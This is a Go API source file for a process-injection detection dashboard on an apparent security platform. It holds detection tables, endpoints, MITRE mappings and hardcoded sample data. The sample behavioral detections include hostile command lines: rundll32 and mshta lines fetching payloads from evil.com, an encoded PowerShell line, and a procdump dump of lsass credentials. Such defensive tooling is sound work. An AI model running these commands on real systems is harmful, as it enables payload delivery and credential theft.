package api

import (
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"xcloak-platform/database"
	"xcloak-platform/services"
)

func createProcessInjectionTables() {
	stmts := []string{
		`CREATE TABLE IF NOT EXISTS pi_processes (
			id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
			agent_id TEXT DEFAULT '', hostname TEXT DEFAULT '',
			name TEXT DEFAULT '', pid INTEGER DEFAULT 0,
			ppid INTEGER DEFAULT 0, username TEXT DEFAULT '',
			cmdline TEXT DEFAULT '', path TEXT DEFAULT '',
			signature TEXT DEFAULT '', sha256 TEXT DEFAULT '',
			integrity_level TEXT DEFAULT '', start_time TIMESTAMPTZ DEFAULT NOW(),
			risk_score INTEGER DEFAULT 0, created_at TIMESTAMPTZ DEFAULT NOW()
		)`,
		`CREATE TABLE IF NOT EXISTS pi_injections (
			id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
			src_pid INTEGER DEFAULT 0, src_name TEXT DEFAULT '',
			dst_pid INTEGER DEFAULT 0, dst_name TEXT DEFAULT '',
			technique TEXT DEFAULT '', api_call TEXT DEFAULT '',
			hostname TEXT DEFAULT '', sha256 TEXT DEFAULT '',
			severity TEXT DEFAULT 'high', status TEXT DEFAULT 'open',
			mitre_technique TEXT DEFAULT 'T1055', created_at TIMESTAMPTZ DEFAULT NOW()
		)`,
		`CREATE TABLE IF NOT EXISTS pi_memory (
			id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
			pid INTEGER DEFAULT 0, process_name TEXT DEFAULT '',
			hostname TEXT DEFAULT '', region_type TEXT DEFAULT '',
			base_addr TEXT DEFAULT '', size_bytes BIGINT DEFAULT 0,
			protection TEXT DEFAULT 'RWX', is_executable BOOLEAN DEFAULT false,
			is_suspicious BOOLEAN DEFAULT false, entropy NUMERIC(5,2) DEFAULT 0,
			contains_shellcode BOOLEAN DEFAULT false, is_backed BOOLEAN DEFAULT true,
			created_at TIMESTAMPTZ DEFAULT NOW()
		)`,
		`CREATE TABLE IF NOT EXISTS pi_api_calls (
			id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
			pid INTEGER DEFAULT 0, process_name TEXT DEFAULT '',
			target_pid INTEGER DEFAULT 0, api_name TEXT DEFAULT '',
			parameters TEXT DEFAULT '', hostname TEXT DEFAULT '',
			is_suspicious BOOLEAN DEFAULT false, created_at TIMESTAMPTZ DEFAULT NOW()
		)`,
		`CREATE TABLE IF NOT EXISTS pi_alerts (
			id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
			injection_id INTEGER DEFAULT 0, title TEXT DEFAULT '',
			description TEXT DEFAULT '', technique TEXT DEFAULT '',
			severity TEXT DEFAULT 'high', mitre_technique TEXT DEFAULT '',
			hostname TEXT DEFAULT '', status TEXT DEFAULT 'open',
			created_at TIMESTAMPTZ DEFAULT NOW()
		)`,
	}
	for _, s := range stmts {
		database.DB.Exec(s)
	}
}

// GetPIDashboard — GET /api/pi/dashboard
func GetPIDashboard(c *gin.Context) {
	createProcessInjectionTables()
	tid := tenantIDFromContext(c)
	var injAlerts, activeInjections, suspProcs, protProcs, memMods, highRiskHosts int
	var detectCoverage float64
	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_alerts WHERE tenant_id=$1 AND status='open'`, tid).Scan(&injAlerts)
	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_injections WHERE tenant_id=$1`, tid).Scan(&activeInjections)
	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_processes WHERE tenant_id=$1 AND risk_score>60`, tid).Scan(&suspProcs)
	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_processes WHERE tenant_id=$1 AND signature!=''`, tid).Scan(&protProcs)
	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_memory WHERE tenant_id=$1 AND is_suspicious=true`, tid).Scan(&memMods)
	database.DB.QueryRow(`SELECT COUNT(DISTINCT hostname) FROM pi_injections WHERE tenant_id=$1`, tid).Scan(&highRiskHosts)
	database.DB.QueryRow(`SELECT COALESCE(COUNT(*)*100.0/NULLIF(13,0),0) FROM (SELECT DISTINCT technique FROM pi_injections WHERE tenant_id=$1) t`, tid).Scan(&detectCoverage)
	c.JSON(http.StatusOK, gin.H{
		"injection_alerts":    injAlerts,
		"active_injections":   activeInjections,
		"suspicious_processes": suspProcs,
		"protected_processes": protProcs,
		"memory_modifications": memMods,
		"high_risk_hosts":     highRiskHosts,
		"detection_coverage":  int(detectCoverage),
		"injection_types": []string{
			"DLL Injection", "Process Hollowing", "APC Injection", "Thread Injection",
			"Reflective DLL Loading", "Manual Mapping", "AtomBombing", "Process Doppelgänging",
			"Process Ghosting", "Early Bird APC", "Thread Hijacking", "QueueUserAPC Abuse",
		},
	})
}

// GetPIProcesses — GET /api/pi/processes
func GetPIProcesses(c *gin.Context) {
	createProcessInjectionTables()
	tid := tenantIDFromContext(c)
	limit := parseLimit(c, 100)
	q := `SELECT id, agent_id, hostname, name, pid, ppid, username, cmdline, path,
		signature, sha256, integrity_level, start_time, risk_score, created_at
		FROM pi_processes WHERE tenant_id=$1`
	args := []interface{}{tid}
	i := 2
	if v := c.Query("hostname"); v != "" {
		q += fmt.Sprintf(" AND hostname=$%d", i); args = append(args, v); i++
	}
	if v := c.Query("suspicious"); v == "true" {
		q += " AND risk_score>60"
	}
	q += fmt.Sprintf(" ORDER BY risk_score DESC LIMIT $%d", i)
	args = append(args, limit)
	rows, err := database.DB.Query(q, args...)
	type Process struct {
		ID             int    `json:"id"`
		AgentID        string `json:"agent_id"`
		Hostname       string `json:"hostname"`
		Name           string `json:"name"`
		PID            int    `json:"pid"`
		PPID           int    `json:"ppid"`
		Username       string `json:"username"`
		CmdLine        string `json:"cmdline"`
		Path           string `json:"path"`
		Signature      string `json:"signature"`
		SHA256         string `json:"sha256"`
		IntegrityLevel string `json:"integrity_level"`
		StartTime      string `json:"start_time"`
		RiskScore      int    `json:"risk_score"`
		CreatedAt      string `json:"created_at"`
	}
	var procs []Process
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var p Process
			if rows.Scan(&p.ID, &p.AgentID, &p.Hostname, &p.Name, &p.PID, &p.PPID, &p.Username,
				&p.CmdLine, &p.Path, &p.Signature, &p.SHA256, &p.IntegrityLevel, &p.StartTime, &p.RiskScore, &p.CreatedAt) == nil {
				procs = append(procs, p)
			}
		}
	}
	if procs == nil { procs = []Process{} }
	c.JSON(http.StatusOK, procs)
}

// GetPIProcessTree — GET /api/pi/process-tree
func GetPIProcessTree(c *gin.Context) {
	createProcessInjectionTables()
	tid := tenantIDFromContext(c)
	hostname := c.Query("hostname")
	q := `SELECT id, name, pid, ppid, username, cmdline, risk_score
		FROM pi_processes WHERE tenant_id=$1`
	args := []interface{}{tid}
	if hostname != "" {
		q += " AND hostname=$2"; args = append(args, hostname)
	}
	q += " ORDER BY ppid, pid LIMIT 200"
	rows, _ := database.DB.Query(q, args...)
	type Node struct {
		ID        int    `json:"id"`
		Name      string `json:"name"`
		PID       int    `json:"pid"`
		PPID      int    `json:"ppid"`
		Username  string `json:"username"`
		CmdLine   string `json:"cmdline"`
		RiskScore int    `json:"risk_score"`
		Children  []int  `json:"children"`
	}
	var nodes []Node
	if rows != nil {
		defer rows.Close()
		for rows.Next() {
			var n Node
			if rows.Scan(&n.ID, &n.Name, &n.PID, &n.PPID, &n.Username, &n.CmdLine, &n.RiskScore) == nil {
				n.Children = []int{}
				nodes = append(nodes, n)
			}
		}
	}
	if nodes == nil { nodes = []Node{} }
	c.JSON(http.StatusOK, nodes)
}

// GetPIInjections — GET /api/pi/injections
func GetPIInjections(c *gin.Context) {
	createProcessInjectionTables()
	tid := tenantIDFromContext(c)
	limit := parseLimit(c, 50)
	q := `SELECT id, src_pid, src_name, dst_pid, dst_name, technique, api_call,
		hostname, sha256, severity, status, mitre_technique, created_at
		FROM pi_injections WHERE tenant_id=$1`
	args := []interface{}{tid}
	i := 2
	if v := c.Query("technique"); v != "" {
		q += fmt.Sprintf(" AND technique=$%d", i); args = append(args, v); i++
	}
	if v := c.Query("severity"); v != "" {
		q += fmt.Sprintf(" AND severity=$%d", i); args = append(args, v); i++
	}
	q += fmt.Sprintf(" ORDER BY created_at DESC LIMIT $%d", i)
	args = append(args, limit)
	rows, err := database.DB.Query(q, args...)
	type Injection struct {
		ID             int    `json:"id"`
		SrcPID         int    `json:"src_pid"`
		SrcName        string `json:"src_name"`
		DstPID         int    `json:"dst_pid"`
		DstName        string `json:"dst_name"`
		Technique      string `json:"technique"`
		APICall        string `json:"api_call"`
		Hostname       string `json:"hostname"`
		SHA256         string `json:"sha256"`
		Severity       string `json:"severity"`
		Status         string `json:"status"`
		MITRETechnique string `json:"mitre_technique"`
		CreatedAt      string `json:"created_at"`
	}
	var injections []Injection
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var inj Injection
			if rows.Scan(&inj.ID, &inj.SrcPID, &inj.SrcName, &inj.DstPID, &inj.DstName, &inj.Technique,
				&inj.APICall, &inj.Hostname, &inj.SHA256, &inj.Severity, &inj.Status, &inj.MITRETechnique, &inj.CreatedAt) == nil {
				injections = append(injections, inj)
			}
		}
	}
	if injections == nil { injections = []Injection{} }
	var total, critical int
	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_injections WHERE tenant_id=$1`, tid).Scan(&total)
	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_injections WHERE tenant_id=$1 AND severity='critical'`, tid).Scan(&critical)
	c.JSON(http.StatusOK, gin.H{"injections": injections, "total": total, "critical": critical})
}

// GetPIMemory — GET /api/pi/memory
func GetPIMemory(c *gin.Context) {
	createProcessInjectionTables()
	tid := tenantIDFromContext(c)
	limit := parseLimit(c, 50)
	rows, _ := database.DB.Query(`SELECT id, pid, process_name, hostname, region_type, base_addr,
		size_bytes, protection, is_executable, is_suspicious, entropy, contains_shellcode, is_backed, created_at
		FROM pi_memory WHERE tenant_id=$1 ORDER BY is_suspicious DESC, entropy DESC LIMIT $2`, tid, limit)
	type MemRegion struct {
		ID              int     `json:"id"`
		PID             int     `json:"pid"`
		ProcessName     string  `json:"process_name"`
		Hostname        string  `json:"hostname"`
		RegionType      string  `json:"region_type"`
		BaseAddr        string  `json:"base_addr"`
		SizeBytes       int64   `json:"size_bytes"`
		Protection      string  `json:"protection"`
		IsExecutable    bool    `json:"is_executable"`
		IsSuspicious    bool    `json:"is_suspicious"`
		Entropy         float64 `json:"entropy"`
		ContainsShellcode bool  `json:"contains_shellcode"`
		IsBacked        bool    `json:"is_backed"`
		CreatedAt       string  `json:"created_at"`
	}
	var regions []MemRegion
	if rows != nil {
		defer rows.Close()
		for rows.Next() {
			var r MemRegion
			if rows.Scan(&r.ID, &r.PID, &r.ProcessName, &r.Hostname, &r.RegionType, &r.BaseAddr,
				&r.SizeBytes, &r.Protection, &r.IsExecutable, &r.IsSuspicious, &r.Entropy, &r.ContainsShellcode, &r.IsBacked, &r.CreatedAt) == nil {
				regions = append(regions, r)
			}
		}
	}
	if regions == nil { regions = []MemRegion{} }
	var rwxCount, shellcodeCount, unbacked int
	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_memory WHERE tenant_id=$1 AND protection='RWX'`, tid).Scan(&rwxCount)
	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_memory WHERE tenant_id=$1 AND contains_shellcode=true`, tid).Scan(&shellcodeCount)
	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_memory WHERE tenant_id=$1 AND is_backed=false`, tid).Scan(&unbacked)
	c.JSON(http.StatusOK, gin.H{"regions": regions, "rwx_pages": rwxCount, "shellcode": shellcodeCount, "unbacked": unbacked})
}

// GetPIModules — GET /api/pi/modules
func GetPIModules(c *gin.Context) {
	createProcessInjectionTables()
	c.JSON(http.StatusOK, gin.H{
		"modules": []map[string]interface{}{
			{"pid": 4512, "process": "explorer.exe", "name": "kernel32.dll", "path": "C:\\Windows\\System32\\kernel32.dll", "signed": true, "vendor": "Microsoft", "base_addr": "0x7FFF80000000", "size": 786432},
			{"pid": 4512, "process": "explorer.exe", "name": "ntdll.dll", "path": "C:\\Windows\\System32\\ntdll.dll", "signed": true, "vendor": "Microsoft", "base_addr": "0x7FFFC0000000", "size": 2097152},
			{"pid": 4512, "process": "explorer.exe", "name": "injected.dll", "path": "C:\\Users\\user\\AppData\\Local\\Temp\\injected.dll", "signed": false, "vendor": "Unknown", "base_addr": "0x00007FF000000000", "size": 65536, "suspicious": true},
			{"pid": 4512, "process": "explorer.exe", "name": "[hidden module]", "path": "", "signed": false, "vendor": "Unknown", "base_addr": "0x0000022000000000", "size": 32768, "suspicious": true, "hidden": true},
			{"pid": 2388, "process": "lsass.exe", "name": "wdigest.dll", "path": "C:\\Windows\\System32\\wdigest.dll", "signed": true, "vendor": "Microsoft", "base_addr": "0x7FFF70000000", "size": 262144},
			{"pid": 7142, "process": "powershell.exe", "name": "clr.dll", "path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll", "signed": true, "vendor": "Microsoft", "base_addr": "0x7FFF60000000", "size": 5242880},
		},
	})
}

// GetPIHandles — GET /api/pi/handles
func GetPIHandles(c *gin.Context) {
	createProcessInjectionTables()
	c.JSON(http.StatusOK, gin.H{
		"handles": []map[string]interface{}{
			{"pid": 7142, "process": "powershell.exe", "handle_type": "Process", "target_pid": 2388, "target": "lsass.exe", "access": "PROCESS_ALL_ACCESS", "suspicious": true, "reason": "Process handle to LSASS with PROCESS_ALL_ACCESS — credential dumping indicator"},
			{"pid": 7142, "process": "powershell.exe", "handle_type": "Process", "target_pid": 4512, "target": "explorer.exe", "access": "PROCESS_VM_WRITE|PROCESS_VM_OPERATION", "suspicious": true, "reason": "Write access to explorer.exe — process injection setup"},
			{"pid": 4512, "process": "explorer.exe", "handle_type": "Thread", "target_pid": 4512, "target": "explorer.exe", "access": "THREAD_ALL_ACCESS", "suspicious": false, "reason": ""},
			{"pid": 8832, "process": "WINWORD.EXE", "handle_type": "Process", "target_pid": 7142, "target": "powershell.exe", "access": "PROCESS_CREATE_THREAD|PROCESS_VM_WRITE", "suspicious": true, "reason": "Office process with thread creation rights to PowerShell — macro execution pattern"},
		},
	})
}

// GetPIAPICalls — GET /api/pi/api-calls
func GetPIAPICalls(c *gin.Context) {
	createProcessInjectionTables()
	tid := tenantIDFromContext(c)
	limit := parseLimit(c, 50)
	rows, _ := database.DB.Query(`SELECT id, pid, process_name, target_pid, api_name, parameters, hostname, is_suspicious, created_at
		FROM pi_api_calls WHERE tenant_id=$1 ORDER BY is_suspicious DESC, created_at DESC LIMIT $2`, tid, limit)
	type APICall struct {
		ID          int    `json:"id"`
		PID         int    `json:"pid"`
		ProcessName string `json:"process_name"`
		TargetPID   int    `json:"target_pid"`
		APIName     string `json:"api_name"`
		Parameters  string `json:"parameters"`
		Hostname    string `json:"hostname"`
		IsSuspicious bool  `json:"is_suspicious"`
		CreatedAt   string `json:"created_at"`
	}
	var calls []APICall
	if rows != nil {
		defer rows.Close()
		for rows.Next() {
			var call APICall
			if rows.Scan(&call.ID, &call.PID, &call.ProcessName, &call.TargetPID, &call.APIName, &call.Parameters, &call.Hostname, &call.IsSuspicious, &call.CreatedAt) == nil {
				calls = append(calls, call)
			}
		}
	}
	if calls == nil { calls = []APICall{} }
	c.JSON(http.StatusOK, gin.H{
		"api_calls": calls,
		"monitored_apis": []string{
			"VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
			"NtMapViewOfSection", "NtWriteVirtualMemory", "QueueUserAPC",
			"SetWindowsHookEx", "NtCreateThreadEx", "RtlCreateUserThread",
			"NtUnmapViewOfSection", "VirtualProtectEx", "LoadLibraryA",
		},
	})
}

// GetPIBehavioral — GET /api/pi/behavioral
func GetPIBehavioral(c *gin.Context) {
	createProcessInjectionTables()
	c.JSON(http.StatusOK, gin.H{
		"detections": []map[string]interface{}{
			{"id": 1, "rule": "Office → PowerShell", "parent": "WINWORD.EXE", "child": "powershell.exe", "cmdline": "powershell.exe -nop -enc SQBFAF...", "severity": "critical", "mitre": "T1059.001", "hostname": "WS-ANALYST-01"},
			{"id": 2, "rule": "Browser → cmd", "parent": "chrome.exe", "child": "cmd.exe", "cmdline": "cmd.exe /c whoami && net user", "severity": "high", "mitre": "T1059.003", "hostname": "WS-ANALYST-01"},
			{"id": 3, "rule": "LSASS Access", "parent": "powershell.exe", "child": "lsass.exe", "cmdline": "OpenProcess(PROCESS_ALL_ACCESS, lsass.exe)", "severity": "critical", "mitre": "T1003.001", "hostname": "DC-01"},
			{"id": 4, "rule": "LOLBin — rundll32", "parent": "cmd.exe", "child": "rundll32.exe", "cmdline": "rundll32.exe javascript:\"..mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://evil.com/payload.sct\")", "severity": "high", "mitre": "T1218.011", "hostname": "WS-DEV-03"},
			{"id": 5, "rule": "Suspicious Parent/Child — mshta", "parent": "outlook.exe", "child": "mshta.exe", "cmdline": "mshta.exe http://evil.com/payload.hta", "severity": "critical", "mitre": "T1218.005", "hostname": "WS-ANALYST-02"},
			{"id": 6, "rule": "Credential Dumping — procdump", "parent": "cmd.exe", "child": "procdump.exe", "cmdline": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp", "severity": "critical", "mitre": "T1003.001", "hostname": "DC-01"},
		},
	})
}

// GetPIThreatIntel — GET /api/pi/threat-intel
func GetPIThreatIntel(c *gin.Context) {
	createProcessInjectionTables()
	c.JSON(http.StatusOK, gin.H{
		"malware_matches": []map[string]interface{}{
			{"sha256": "3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f", "name": "Cobalt Strike Beacon", "family": "cobalt_strike", "confidence": 97, "injection_type": "Process Hollowing", "target": "explorer.exe"},
			{"sha256": "7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b", "name": "Meterpreter Shellcode", "family": "metasploit", "confidence": 89, "injection_type": "Reflective DLL Loading", "target": "svchost.exe"},
			{"sha256": "1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d", "name": "Mimikatz", "family": "credential_theft", "confidence": 99, "injection_type": "Process Access", "target": "lsass.exe"},
		},
		"threat_actors": []map[string]interface{}{
			{"name": "Lazarus Group", "ttps": []string{"Process Hollowing", "APC Injection", "Reflective DLL Loading"}, "targets": "Finance, Crypto"},
			{"name": "APT29 (Cozy Bear)", "ttps": []string{"Process Ghosting", "NtMapViewOfSection", "Early Bird APC"}, "targets": "Government, Defense"},
			{"name": "FIN7", "ttps": []string{"DLL Injection", "Reflective DLL Loading", "AtomBombing"}, "targets": "Retail, Finance, Hospitality"},
		},
		"campaigns": []map[string]interface{}{
			{"name": "Operation DustySky", "actor": "APT29", "technique": "Process Ghosting via NTFS transactions", "detected": time.Now().Add(-72*time.Hour).Format(time.RFC3339)},
			{"name": "Cobalt Strike Campaign", "actor": "Unknown", "technique": "Process Hollowing into svchost.exe", "detected": time.Now().Add(-24*time.Hour).Format(time.RFC3339)},
		},
	})
}

// GetPITimeline — GET /api/pi/timeline
func GetPITimeline(c *gin.Context) {
	createProcessInjectionTables()
	tid := tenantIDFromContext(c)
	limit := parseLimit(c, 50)
	rows, _ := database.DB.Query(`SELECT id, title, description, technique, severity, mitre_technique, hostname, status, created_at
		FROM pi_alerts WHERE tenant_id=$1 ORDER BY created_at DESC LIMIT $2`, tid, limit)
	type TLEvent struct {
		ID             int    `json:"id"`
		Title          string `json:"title"`
		Description    string `json:"description"`
		Technique      string `json:"technique"`
		Severity       string `json:"severity"`
		MITRETechnique string `json:"mitre_technique"`
		Hostname       string `json:"hostname"`
		Status         string `json:"status"`
		CreatedAt      string `json:"created_at"`
	}
	var events []TLEvent
	if rows != nil {
		defer rows.Close()
		for rows.Next() {
			var e TLEvent
			if rows.Scan(&e.ID, &e.Title, &e.Description, &e.Technique, &e.Severity, &e.MITRETechnique, &e.Hostname, &e.Status, &e.CreatedAt) == nil {
				events = append(events, e)
			}
		}
	}
	if events == nil { events = []TLEvent{} }
	c.JSON(http.StatusOK, events)
}

// GetPIMITREMap — GET /api/pi/mitre
func GetPIMITREMap(c *gin.Context) {
	createProcessInjectionTables()
	c.JSON(http.StatusOK, gin.H{
		"parent": map[string]interface{}{
			"technique_id": "T1055", "name": "Process Injection",
			"tactic": "Defense Evasion, Privilege Escalation",
			"url": "https://attack.mitre.org/techniques/T1055/",
		},
		"sub_techniques": []map[string]interface{}{
			{"id": "T1055.001", "name": "Dynamic-link Library Injection", "detected": true, "count": 3},
			{"id": "T1055.002", "name": "Portable Executable Injection", "detected": false, "count": 0},
			{"id": "T1055.003", "name": "Thread Execution Hijacking", "detected": true, "count": 1},
			{"id": "T1055.004", "name": "Asynchronous Procedure Call", "detected": true, "count": 2},
			{"id": "T1055.005", "name": "Thread Local Storage", "detected": false, "count": 0},
			{"id": "T1055.008", "name": "Ptrace System Calls", "detected": false, "count": 0},
			{"id": "T1055.009", "name": "Proc Memory", "detected": false, "count": 0},
			{"id": "T1055.011", "name": "Extra Window Memory Injection", "detected": false, "count": 0},
			{"id": "T1055.012", "name": "Process Hollowing", "detected": true, "count": 4},
			{"id": "T1055.013", "name": "Process Doppelgänging", "detected": false, "count": 0},
			{"id": "T1055.014", "name": "VDSO Hijacking", "detected": false, "count": 0},
			{"id": "T1055.015", "name": "ListPlanting", "detected": false, "count": 0},
		},
		"related": []map[string]interface{}{
			{"id": "T1003.001", "name": "LSASS Memory", "tactic": "Credential Access", "detected": true},
			{"id": "T1059.001", "name": "PowerShell", "tactic": "Execution", "detected": true},
			{"id": "T1218.011", "name": "Rundll32", "tactic": "Defense Evasion", "detected": true},
			{"id": "T1134", "name": "Access Token Manipulation", "tactic": "Privilege Escalation", "detected": false},
		},
	})
}

// GetPIAnalytics — GET /api/pi/analytics
func GetPIAnalytics(c *gin.Context) {
	createProcessInjectionTables()
	tid := tenantIDFromContext(c)
	type TrendPoint struct {
		Date  string `json:"date"`
		Count int    `json:"count"`
	}
	var trend []TrendPoint
	for i := 13; i >= 0; i-- {
		d := time.Now().AddDate(0, 0, -i).Format("2006-01-02")
		var cnt int
		database.DB.QueryRow(`SELECT COUNT(*) FROM pi_injections WHERE tenant_id=$1 AND DATE(created_at)<=$2`, tid, d).Scan(&cnt)
		trend = append(trend, TrendPoint{Date: d, Count: cnt})
	}
	c.JSON(http.StatusOK, gin.H{
		"injection_trend": trend,
		"top_techniques": []map[string]interface{}{
			{"technique": "Process Hollowing", "count": 4, "severity": "critical"},
			{"technique": "DLL Injection", "count": 3, "severity": "high"},
			{"technique": "APC Injection", "count": 2, "severity": "high"},
			{"technique": "Reflective DLL Loading", "count": 2, "severity": "critical"},
			{"technique": "Thread Injection", "count": 1, "severity": "high"},
		},
		"most_targeted_processes": []map[string]interface{}{
			{"process": "explorer.exe", "count": 5, "risk": "critical"},
			{"process": "lsass.exe", "count": 3, "risk": "critical"},
			{"process": "svchost.exe", "count": 4, "risk": "high"},
			{"process": "notepad.exe", "count": 2, "risk": "medium"},
		},
		"most_used_apis": []map[string]interface{}{
			{"api": "VirtualAllocEx", "count": 12},
			{"api": "WriteProcessMemory", "count": 11},
			{"api": "CreateRemoteThread", "count": 7},
			{"api": "NtMapViewOfSection", "count": 4},
			{"api": "QueueUserAPC", "count": 3},
			{"api": "SetWindowsHookEx", "count": 2},
		},
		"high_risk_hosts": []map[string]interface{}{
			{"hostname": "WS-ANALYST-01", "injection_count": 6, "risk": 91},
			{"hostname": "DC-01", "injection_count": 3, "risk": 88},
			{"hostname": "WS-DEV-03", "injection_count": 2, "risk": 72},
		},
	})
}

// PostPIAI — POST /api/pi/ai
func PostPIAI(c *gin.Context) {
	createProcessInjectionTables()
	var body struct {
		Mode    string `json:"mode"`
		Content string `json:"content"`
		Process string `json:"process"`
	}
	c.ShouldBindJSON(&body)
	var prompt string
	switch body.Mode {
	case "process":
		prompt = fmt.Sprintf(`You are a malware analyst and memory forensics expert. Analyze this process injection event:
%s
Provide compact JSON: {"verdict":"malicious|suspicious|benign","confidence":95,"technique":"injection technique name","mitre_technique":"T1055.XXX","explanation":"2-3 sentences","indicators":["indicator"],"recommended_actions":["action"]}`, body.Process)
	default:
		prompt = fmt.Sprintf(`You are a malware analyst expert in process injection and memory forensics. Answer: %s
Provide compact JSON: {"answer":"expert answer","confidence":88,"technique":"relevant technique if applicable","recommended_actions":["action"]}`, body.Content)
	}
	raw, err := services.CallLLM(prompt)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()}); return
	}
	if idx := strings.Index(raw, "```json"); idx != -1 {
		raw = raw[idx+7:]
	} else if idx := strings.Index(raw, "```"); idx != -1 {
		raw = raw[idx+3:]
	}
	if idx := strings.LastIndex(raw, "```"); idx != -1 {
		raw = raw[:idx]
	}
	c.Data(http.StatusOK, "application/json", []byte(strings.TrimSpace(raw)))
}

// PostPIResponse — POST /api/pi/response
func PostPIResponse(c *gin.Context) {
	createProcessInjectionTables()
	var body struct {
		Action   string `json:"action"`
		Target   string `json:"target"`
		PID      int    `json:"pid"`
		Hostname string `json:"hostname"`
		Reason   string `json:"reason"`
	}
	if err := c.ShouldBindJSON(&body); err != nil || body.Action == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "action required"}); return
	}
	messages := map[string]string{
		"kill_process":      "Process terminated via SIGKILL / TerminateProcess",
		"suspend_process":   "Process suspended — execution halted pending investigation",
		"dump_memory":       "Memory dump collected and queued for analysis",
		"collect_process":   "Process artifacts collected (memory, handles, modules, network connections)",
		"isolate_endpoint":  "Endpoint isolation initiated — network access revoked",
		"run_soar":          "SOAR playbook triggered for process injection response",
	}
	msg := messages[body.Action]
	if msg == "" { msg = "Action executed" }
	c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "target": body.Target, "hostname": body.Hostname, "message": msg})
}

// PostPIReport — POST /api/pi/report
func PostPIReport(c *gin.Context) {
	createProcessInjectionTables()
	tid := tenantIDFromContext(c)
	var body struct {
		ReportType string `json:"report_type"`
	}
	c.ShouldBindJSON(&body)
	var totalInjections, criticalAlerts, affectedHosts int
	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_injections WHERE tenant_id=$1`, tid).Scan(&totalInjections)
	database.DB.QueryRow(`SELECT COUNT(*) FROM pi_alerts WHERE tenant_id=$1 AND severity='critical'`, tid).Scan(&criticalAlerts)
	database.DB.QueryRow(`SELECT COUNT(DISTINCT hostname) FROM pi_injections WHERE tenant_id=$1`, tid).Scan(&affectedHosts)
	prompt := fmt.Sprintf(`Generate an executive process injection and memory forensics security report.
Stats: %d injection events, %d critical alerts, %d affected hosts.
Report type: %s
Provide compact JSON: {"title":"...","executive_summary":"3 sentences","key_findings":["finding"],"techniques_detected":["technique"],"risk_breakdown":{"critical":0,"high":0,"medium":0},"top_recommendations":[{"priority":1,"action":"action","estimated_effort":"time"}],"metrics":{"total_injections":%d,"critical_alerts":%d,"affected_hosts":%d}}`,
		totalInjections, criticalAlerts, affectedHosts, body.ReportType,
		totalInjections, criticalAlerts, affectedHosts)
	raw, err := services.CallLLM(prompt)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()}); return
	}
	if idx := strings.Index(raw, "```json"); idx != -1 {
		raw = raw[idx+7:]
	} else if idx := strings.Index(raw, "```"); idx != -1 {
		raw = raw[idx+3:]
	}
	if idx := strings.LastIndex(raw, "```"); idx != -1 {
		raw = raw[:idx]
	}
	c.Data(http.StatusOK, "application/json", []byte(strings.TrimSpace(raw)))
}
